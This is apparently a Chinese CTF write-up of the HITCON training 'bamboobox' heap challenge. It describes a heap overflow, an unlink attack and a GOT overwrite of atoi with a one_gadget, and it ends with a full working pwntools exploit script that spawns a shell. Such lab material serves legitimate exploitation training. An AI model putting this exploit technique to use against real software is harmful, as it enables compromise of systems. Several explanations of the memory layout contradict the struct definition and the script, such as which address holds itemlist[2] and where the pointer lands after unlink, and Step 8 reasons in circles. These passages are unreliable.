# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: off (程序基址固定)
  - NX: on
  - RELRO: Partial RELRO (GOT表可写)
  - Canary: on (仅栈保护，堆漏洞不受影响)

# 漏洞成因
## 程序关键结构体
程序使用一个全局数组`itemlist`在`.bss`段（起始地址`0x6020c8`）来管理堆块。每个数组元素是一个结构体，包含一个指向堆块的指针和该堆块的大小（仅存储了申请的长度，非chunk的size字段）。
```c
struct item {
    char* name_ptr;   // 位于 0x6020c8 + 16*i
    int size;         // 位于 0x6020d0 + 16*i
} itemlist[100];
```

## 漏洞定位
漏洞位于`change_item`函数中。该函数允许用户修改一个已存在堆块的内容，但在读取新内容时，使用了用户输入的`v2`作为读取长度，而没有检查该长度是否超过了该堆块最初分配时的大小（`size`字段）。这导致了**堆溢出**。
```c
// 关键漏洞代码
printf("Please enter the new name of the item:");
*(_BYTE *)(*((_QWORD *)&unk_6020C8 + 2 * v1) + (int)read(0, *((void **)&unk_6020C8 + 2 * v1), v2)) = 0;
// 用户可控的 `v2` 作为 read 的长度参数，可以超出原堆块边界。
```

# 漏洞利用过程：
本程序利用**Unlink**攻击技术，通过堆溢出修改相邻堆块的`chunk header`（`size`, `fd`, `bk`），在释放该堆块时触发`unlink`操作，从而将`itemlist`中的一个指针修改为指向`itemlist`数组自身附近。随后，利用该指针读写全局数组，将另一个指针覆盖为`atoi@got`地址，泄漏`libc`基址，最终将`atoi@got`改写为`one_gadget`地址，在程序下次调用`atoi`（如选择退出时）时获得shell。
- Step1~2: 进行堆布局，分配两个相邻堆块，并利用堆溢出伪造第一个堆块（chunk0）为释放状态，同时修改第二个堆块（chunk1）的`prev_size`和`size`的`PREV_INUSE`位，以绕过`unlink`安全检查。
- Step3: 释放chunk1，触发`unlink`，将`itemlist[0].name_ptr`修改为指向`itemlist`数组自身（`0x6020b8`）。
- Step4: 利用Step3获得的写能力，修改`itemlist[2]`（实际上是数组自身的一个slot），使其指向`atoi@got`。
- Step5~6: 展示堆块内容，泄漏`atoi`在内存中的地址，并计算`libc`基址和`one_gadget`地址。
- Step7: 再次利用Step3获得的写能力，将`atoi@got`中的地址修改为`one_gadget`地址。
- Step8: 触发`exit`流程（调用`goodbye_message`后执行`exit(0)`，`exit`内部会调用`atoi`？），实际利用中，选择菜单项`5`会调用`v4[1]()`即`goodbye_message()`，然后调用`exit(0)`。`exit`函数在libc中，但其内部清理流程可能不会调用`atoi`。检查代码发现，`case 5`分支会调用`v4[1]()`（`goodbye_message`）后直接`exit(0)`。然而，`goodbye_message`函数是程序自定义的，不会调用`atoi`。此处利用可能依赖于**下一次调用`atoi`**，例如再次进行菜单选择时。但exp中在Step7后直接调用`exit()`函数，这会导致程序执行`exit@plt`，进而跳转到`exit@got`。**注意**：攻击目标是`atoi@got`，而非`exit@got`。因此，劫持控制流需要程序再次调用`atoi`。在exp的`exit()`函数（用户自定义的封装函数）中，它向程序发送了字符`'5'`，这会触发`case 5`，程序会调用`atoi(buf)`来转换输入的`"5"`。因此，**在程序执行`case 5`之前，会先调用`atoi(“5”)`，此时`atoi@got`已被覆盖为`one_gadget`，从而获得shell**。

## Step1
- 通过`malloc(0x80, b'aaaa')`分配chunk0（假设地址为`0x10ff010`）。
- 通过`malloc(0x80, b'bbbb')`分配chunk1（地址为`0x10ff0a0`，紧邻chunk0）。
- **内存变化**：在堆区创建了两个大小为`0x90`（`0x80`用户数据 + `0x10`chunk头）的chunk。全局数组`itemlist[0]`和`itemlist[1]`被填充。

## Step2
- 构造Payload (`py1`)：
  - `p64(0) + p64(0x81)`：伪造chunk0的`prev_size`和`size`，`size`设为`0x81`（`PREV_INUSE`位为1，表示前一个chunk在使用中，这是伪造的chunk状态）。
  - `p64(FD) + p64(BK)`：伪造chunk0的`fd`和`bk`指针，指向`itemlist`数组附近（`FD = 0x6020c8 - 3*8 = 0x6020b0`，`BK = 0x6020b8`）。这是为了通过`unlink`检查：`P->fd->bk == P && P->bk->fd == P`。
  - `b"a"*0x60`：填充chunk0的用户数据区。
  - `p64(0x80) + p64(0x90)`：覆盖到chunk1的`prev_size`和`size`字段。将`prev_size`设置为`0x80`（即伪造的chunk0大小），将`size`的`PREV_INUSE`位清零（`0x90 & ~1 = 0x90`），让系统认为chunk0是空闲状态。
- 调用`change(0, 0x90, py1)`，利用堆溢出完成上述内存篡改。
- **关键内存变化**：
  - 堆地址`0x10ff0a0 - 0x10`（chunk1的`prev_size`）处的内容由`0x0`变为`0x80`。
  - 堆地址`0x10ff0a0 - 0x8`（chunk1的`size`）处的内容由`0x91`（`0x80`用户数据+`0x10`头+`1`的`PREV_INUSE`）变为`0x90`（`PREV_INUSE`位清零）。

## Step3
- 调用`free(1)`释放chunk1。
- **内存变化**：
  - `libc`检测到chunk1的前一个chunk（chunk0）的`PREV_INUSE`为0，认为chunk0是空闲的，因此尝试将chunk0和chunk1合并。合并前会对chunk0执行`unlink`操作。
  - **`unlink`操作**：将伪造的`FD->bk`（即`*(0x6020b0 + 0x18) = *(0x6020c8)`）设置为`BK`（`0x6020b8`）；将伪造的`BK->fd`（即`*(0x6020b8 + 0x10) = *(0x6020c8)`）设置为`FD`（`0x6020b0`）。**最终导致全局数组`itemlist[0].name_ptr`（地址`0x6020c8`）的值被修改为`0x6020b8`**。现在，`itemlist[0]`指向了`itemlist`数组内部。

## Step4
- 构造Payload (`py2`)：`b'a'*24 + p64(atoi_got)`。`b'a'*24`用于从`0x6020b8`填充到`0x6020d0`，其中`0x6020d0`是`itemlist[2].name_ptr`的地址。
- 调用`change(0, len(py2), py2)`。由于`itemlist[0].name_ptr`现在指向`0x6020b8`，修改该指针指向的内存，实际上是在修改`itemlist`数组自身。Payload将`itemlist[2].name_ptr`（`0x6020d0`处）覆盖为`atoi@got`地址（例如`0x602080`）。
- **内存变化**：全局变量`0x6020d0`处的内容由`0x0`变为`0x602080`（`atoi@got`地址）。

## Step5
- 调用`puts()`（即`show_item`函数）。程序会遍历`itemlist`，打印`itemlist[2].name_ptr`指向的内容，即`atoi@got`中存储的`atoi`函数在libc中的地址。
- **内存变化**：无。程序输出中包含泄漏的`atoi`地址。

## Step6
- 从程序输出中解析出`atoi`的地址。调试记录中地址为`0x7f8c2e0d6440`。
- 计算`libc`基址：`libc_base = atoi_addr - libc.symbols["atoi"]`。

## Step7
- 计算`one_gadget`地址：`one_gadget = libc_base + 0xf03a4`（此`one_gadget`偏移来源于exp，对应libc 2.23）。
- 再次调用`change(0, 0x10, p64(onegadget))`。此时`itemlist[0].name_ptr`仍指向`0x6020b8`，写入`p64(onegadget)`会覆盖`itemlist[2].name_ptr`（`0x6020d0`）及其相邻内存。由于`itemlist[2].name_ptr`是`atoi@got`地址（`0x602080`），写入`p64(onegadget)`实际上是在向`0x602080`地址写入`onegadget`值。
- **内存变化**：`atoi@got`地址`0x602080`处的内容由`0x7f8c2e0d6440`（`atoi`地址）变为`0x7f8c2e1c63a4`（`one_gadget`地址）。

## Step8
- 调用`exit()`（用户自定义函数），向程序发送菜单选项`'5'`。
- **触发控制流劫持**：程序调用`atoi("5")`，此时`atoi@got`已被覆盖为`one_gadget`地址，因此跳转到`one_gadget`执行，获得shell。

## Step9
- 通过`p.interactive()`与获得的shell进行交互。

# Exploit：
```python
from pwn import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_08_hitcontrainning_lab11_bamboobox')
p = process('./data/bin/heap23_08_hitcontrainning_lab11_bamboobox')
libc = elf.libc

sl = lambda s : p.sendline(s.encode() if isinstance(s, str) else s)
sd = lambda s : p.send(s.encode() if isinstance(s, str) else s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s.encode() if isinstance(s, str) else s)
ti = lambda : p.interactive()

def malloc(size,content):
    ru("Your choice:")
    sl('2')
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the name of item:")
    sd(content)

def free(index):
    ru("Your choice:")
    sl('4')
    ru("Please enter the index of item:")
    sl(str(index))

def exit():
    ru("Your choice:")
    sl('5')

def puts():
    ru("Your choice:")
    sl('1')

def change(index,size,content):
    ru("Your choice:")
    sl('3')
    ru("Please enter the index of item:")
    sd(str(index))
    ru("Please enter the length of item name:")
    sd(str(size))
    ru("Please enter the new name of the item:")
    sd(content)

# Step 1: 堆布局，分配两个相邻堆块
malloc(0x80,b'aaaa');malloc(0x80,b'bbbb')

# Step 2: 利用堆溢出伪造chunk0并修改chunk1的元数据
# FD/BK 指向 itemlist 数组内部，以满足 unlink 检查
FD = 0x6020c8 - 3*8  # 0x6020b0
BK = FD + 8          # 0x6020b8
# Payload 结构: [伪造的chunk0 header] + [填充] + [修改chunk1的prev_size和size]
py1 = p64(0) + p64(0x81) + p64(FD) + p64(BK) + b"a"*0x60 + p64(0x80) + p64(0x90)
change(0,0x90,py1)

# Step 3: 释放chunk1，触发unlink，导致itemlist[0].name_ptr指向0x6020b8
free(1)

# Step 4: 利用现在 itemlist[0] 指向数组内部的特性，修改 itemlist[2].name_ptr 为 atoi@got
atoi_got = elf.got["atoi"]
py2 = b'a'*24 + p64(atoi_got)  # 从 0x6020b8 到 0x6020d0 的距离是24字节
change(0,len(py2),py2)

# Step 5: 泄漏 atoi 地址
puts()
# Step 6: 解析泄漏的地址
# 注意 recvuntil 的参数，程序输出格式是 "2 : \x40\x64\x0d\x2e\x8c\x7f\n--"
atoi_addr = u64(ru(b'\n--')[4:10].ljust(8,b'\x00')) # 提取地址字节并填充为8字节

# Step 7: 计算 one_gadget 并覆写 atoi@got
onegadget = atoi_addr - libc.symbols["atoi"] + 0xf03a4 # libc 2.23 下的一个 one_gadget 偏移
change(0,0x10,p64(onegadget)) # 向 itemlist[0].name_ptr (0x6020b8) 写入，实际修改了 atoi@got

# Step 8: 触发 atoi 调用（通过发送菜单选项'5'），跳转到 one_gadget
exit()

# Step 9: 获得 shell
p.interactive()
```